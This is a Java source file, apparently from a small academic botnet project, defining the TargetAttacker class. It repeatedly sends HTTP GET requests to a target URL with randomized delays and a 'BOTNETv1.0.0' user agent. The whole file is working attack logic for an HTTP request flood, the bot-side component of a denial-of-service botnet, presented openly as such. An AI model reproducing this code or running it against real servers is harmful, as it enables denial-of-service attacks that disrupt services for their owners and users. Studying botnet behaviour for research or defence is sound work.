/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package com.giammp.botnet.control;

import com.giammp.botnet.model.Target;
import com.giammp.botnet.tools.RandomTools;
import lombok.Data;

import java.io.IOException;
import java.net.*;
import java.util.Random;

/**
 * This class realizes the runnable performing the GET attack.
 * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0.0
 * @see Target
 */
@Data
public class TargetAttacker implements Runnable {
  private final Target target;
  private Random rnd = new Random();

  @Override
  public void run() {
    Target tgt = this.getTarget();
    long i = 0;
    for (i = 0; i < tgt.getMaxAttempts(); i++) {
      try {
        this.makeGetRequest(tgt.getUrl());
      } catch (IOException e) {
        e.printStackTrace();
        return;
      }
      int millis = RandomTools.getRandomInt(tgt.getPeriod().getMin(), tgt.getPeriod().getMax(),
          this.getRnd());
      try {
        Thread.sleep(millis);
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
    }
  }

  private void makeGetRequest(final URL url) throws IOException {
    HttpURLConnection http = (HttpURLConnection) url.openConnection();
    http.setRequestMethod("GET");
    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
    int response = http.getResponseCode();
    System.out.format("[BOT]> GET %s :: %d\n", url, response);
  }

}
